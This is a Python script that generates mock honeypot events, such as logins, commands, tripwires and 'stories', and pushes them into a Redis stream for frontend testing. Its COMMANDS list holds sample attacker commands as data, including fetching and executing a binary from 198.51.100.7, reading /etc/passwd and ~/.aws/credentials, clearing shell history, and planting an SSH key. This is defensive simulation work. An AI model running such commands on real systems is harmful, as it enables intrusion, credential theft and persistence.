"""push fake public events (source=mock) into redis stream "events".

lets the frontend test against the real api before trap and brain are connected.

    pip install -e contracts/py redis
    python scripts/mock_events.py --redis-url redis://localhost:6379/0 --rate 2
"""

import argparse
import asyncio
import hashlib
import json
import random
import uuid
from datetime import datetime, timezone

import redis.asyncio as aioredis
from hacktx_contracts import parse_event

STREAM = "events"

CITIES = [
    ("Amsterdam", "NL", 52.37, 4.9),
    ("Frankfurt", "DE", 50.11, 8.68),
    ("Moscow", "RU", 55.76, 37.62),
    ("Beijing", "CN", 39.9, 116.41),
    ("Shanghai", "CN", 31.23, 121.47),
    ("Seoul", "KR", 37.57, 126.98),
    ("Singapore", "SG", 1.35, 103.82),
    ("Mumbai", "IN", 19.08, 72.88),
    ("Sao Paulo", "BR", -23.55, -46.63),
    ("Ashburn", "US", 39.04, -77.49),
    ("San Jose", "US", 37.34, -121.89),
    ("Hanoi", "VN", 21.03, 105.85),
    ("Jakarta", "ID", -6.21, 106.85),
    ("Lagos", "NG", 6.52, 3.38),
    ("Tehran", "IR", 35.69, 51.39),
    ("Bucharest", "RO", 44.43, 26.1),
    ("Kyiv", "UA", 50.45, 30.52),
    ("Johannesburg", "ZA", -26.2, 28.05),
    ("Sydney", "AU", -33.87, 151.21),
    ("Toronto", "CA", 43.65, -79.38),
    (None, "XX", 0.0, 0.0),
]

FAMILIES = ["mirai", "gafgyt", "xorddos", "kinsing", "redtail", "outlaw", "dota3", "mozi"]
USERNAMES = ["root", "admin", "ubuntu", "user", "pi", "test", "oracle", "postgres", "git", "support"]

BOT_CLIENTS = ["SSH-2.0-Go", "SSH-2.0-libssh2_1.10.0", "SSH-2.0-paramiko_3.4.0", "SSH-2.0-ZGrab ZGrab SSH Survey"]
HUMAN_CLIENTS = ["SSH-2.0-OpenSSH_9.6p1 Ubuntu-3ubuntu13", "SSH-2.0-PuTTY_Release_0.81", "SSH-2.0-OpenSSH_8.9"]
AGENT_CLIENTS = ["SSH-2.0-paramiko_3.5.0", "SSH-2.0-asyncssh_2.17.0", "SSH-2.0-OpenSSH_9.8"]

# command, output, techniques
COMMANDS = [
    ("uname -a", "Linux web01 5.15.0-112-generic #122-Ubuntu SMP x86_64 GNU/Linux", ["T1082"]),
    ("whoami", "root", ["T1033"]),
    ("id", "uid=0(root) gid=0(root) groups=0(root)", ["T1033"]),
    ("cat /etc/passwd", "root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin", ["T1087.001"]),
    ("cat /proc/cpuinfo | grep name | wc -l", "4", ["T1082"]),
    ("free -m", "              total        used        free\nMem:           7951        1203        5204", ["T1082"]),
    ("ls -la /root", "total 28\ndrwx------  4 root root 4096 Oct 20 11:02 .\n-rw-------  1 root root  512 .bash_history", ["T1083"]),
    ("ps aux", "USER  PID %CPU %MEM COMMAND\nroot    1  0.0  0.1 /sbin/init\nroot  812  0.0  0.3 /usr/sbin/sshd -D", ["T1057"]),
    ("crontab -l", "no crontab for root", ["T1053.003"]),
    ("wget http://198.51.100.7/x86 -O /tmp/.x", "Connecting to 198.51.100.7:80... connected.\nHTTP request sent, awaiting response... 200 OK", ["T1105"]),
    ("chmod +x /tmp/.x && /tmp/.x", "bash: /tmp/.x: cannot execute binary file: Exec format error", ["T1059.004"]),
    ("cat ~/.aws/credentials", "[default]\naws_access_key_id = AKIAIOSFODNN7EXAMPLE", ["T1552.001"]),
    ("history -c", "", ["T1070.003"]),
    ("netstat -tulpn", "tcp 0 0 0.0.0.0:22 0.0.0.0:* LISTEN 812/sshd", ["T1049"]),
    ("echo 'ssh-rsa AAAAB3Nza... op' >> ~/.ssh/authorized_keys", "", ["T1098.004"]),
]

STORIES = [
    "A {family} swarm drifted in from {city}, rattled the gate a few times, and slipped inside to count our cpus.",
    "Someone in {city} knocked politely, guessed the password on the third try, then went looking for cloud keys.",
    "An agent from {city} moved fast and methodical, mapping the house before trying to plant a key under the mat.",
    "A lone scout from {city} peeked through the window, saw nothing worth stealing, and wandered off.",
]

DOSSIERS = [
    ("Address seen in public scan feeds hitting ssh on many hosts.", "https://www.abuseipdb.com/"),
    ("Payload matches a known botnet loader.", "https://www.virustotal.com/"),
    ("Hosting provider frequently reported for brute force traffic.", "https://www.spamhaus.org/"),
]


def now_ts() -> str:
    t = datetime.now(timezone.utc)
    return t.strftime("%Y-%m-%dT%H:%M:%S.") + f"{t.microsecond // 1000:03d}Z"


def make_profile() -> dict:
    kind = random.choices(["bot", "human", "agent", "unknown"], weights=[60, 20, 12, 8])[0]
    reputation = random.choices(["harmless", "unknown", "malicious"], weights=[20, 30, 50])[0]
    family = random.choice(FAMILIES) if kind == "bot" and reputation == "malicious" else None
    if random.random() < 0.05:
        threat = "critical"
    elif reputation == "malicious":
        threat = random.choice(["med", "high"])
    else:
        threat = random.choice(["low", "low", "med"])
    client = {"bot": BOT_CLIENTS, "human": HUMAN_CLIENTS, "agent": AGENT_CLIENTS}.get(kind, BOT_CLIENTS)
    return {
        "kind": kind,
        "confidence": round(random.uniform(0.55, 0.99), 2),
        "reputation": reputation,
        "family": family,
        "threat": threat,
        "client": random.choice(client),
        "ip_hash": hashlib.sha256(uuid.uuid4().bytes).hexdigest(),
    }


def make_geo() -> dict:
    city, country, lat, lon = random.choice(CITIES)
    # jitter a little so the globe doesn't stack every hit on one pixel
    jitter = 0 if country == "XX" else 0.4
    return {
        "lat": round(max(-90, min(90, lat + random.uniform(-jitter, jitter))), 2),
        "lon": round(max(-180, min(180, lon + random.uniform(-jitter, jitter))), 2),
        "country": country,
        "city": city,
    }


class Session:
    def __init__(self):
        self.id = f"mock-{uuid.uuid4().hex[:12]}"
        self.protocol = random.choices(["ssh", "http"], weights=[85, 15])[0]
        self.geo = make_geo()
        self.profile = make_profile()

    def event(self, type_: str, detail: dict, attacker: dict | None = None) -> dict:
        ev = {
            "event_id": str(uuid.uuid4()),
            "session_id": self.id,
            "type": type_,
            "timestamp": now_ts(),
            "source": "mock",
            "protocol": self.protocol,
            "geo": self.geo,
            "attacker": attacker or self.profile,
            "detail": detail,
        }
        parse_event(ev)  # never push something the contract rejects
        return ev


async def run_session(r, pace: float) -> None:
    s = Session()
    # brain does not know who it is yet at session_start
    unknown = {**s.profile, "kind": "unknown", "confidence": 0.0, "family": None}

    async def emit(ev: dict, delay: float = 1.0) -> None:
        await r.xadd(STREAM, {"data": json.dumps(ev)})
        await asyncio.sleep(delay * pace * random.uniform(0.5, 1.5))

    await emit(s.event("session_start", {}, unknown))
    fails = random.choices([0, 1, 2, 4, 8], weights=[10, 25, 25, 25, 15])[0]
    for _ in range(fails):
        await emit(s.event("login_fail", {"username": random.choice(USERNAMES)}, unknown), 0.5)

    await emit(s.event("classified", {"reasons": [f"client looks like a {s.profile['kind']}"]}))
    if random.random() < 0.6:
        await emit(s.event("login_success", {"username": random.choice(USERNAMES)}))
        count = random.randint(1, 8)
        for cmd, out, techniques in random.sample(COMMANDS, count):
            detail = {
                "command": cmd,
                "output": out[:500],
                "response_ms": random.randint(3, 1800),
                "answered_by": random.choices(["engine", "llm", "cache"], weights=[60, 25, 15])[0],
                "techniques": techniques,
            }
            await emit(s.event("command", detail))
            if "credentials" in cmd:
                await emit(s.event("tripwire", {"tripwire_id": "aws-keys", "reasons": ["read fake cloud keys"]}))
    else:
        count = 0

    if s.profile["reputation"] == "malicious" and random.random() < 0.5:
        summary, url = random.choice(DOSSIERS)
        await emit(s.event("dossier", {"summary": summary, "sources": [{"title": "reputation lookup", "url": url}]}))
    if random.random() < 0.5:
        story = random.choice(STORIES).format(family=s.profile["family"] or "bot", city=s.geo["city"] or "nowhere")
        await emit(s.event("story", {"story": story}))
    await emit(s.event("session_end", {"duration_s": round(random.uniform(2, 300), 1), "command_count": count}), 0)


async def main() -> None:
    parser = argparse.ArgumentParser(description=__doc__.splitlines()[0])
    parser.add_argument("--redis-url", default="redis://localhost:6379/0")
    parser.add_argument("--rate", type=float, default=1.0, help="new sessions per second")
    parser.add_argument("--sessions", type=int, default=0, help="stop after this many (0 = forever)")
    parser.add_argument("--pace", type=float, default=1.0, help="seconds between events in a session")
    args = parser.parse_args()

    r = aioredis.from_url(args.redis_url, decode_responses=True)
    running: set[asyncio.Task] = set()
    started = 0
    try:
        while not args.sessions or started < args.sessions:
            task = asyncio.create_task(run_session(r, args.pace))
            running.add(task)
            task.add_done_callback(running.discard)
            started += 1
            await asyncio.sleep(random.expovariate(args.rate))
        await asyncio.gather(*running)
        print(f"pushed {started} mock sessions")
    finally:
        await r.aclose()


if __name__ == "__main__":
    asyncio.run(main())
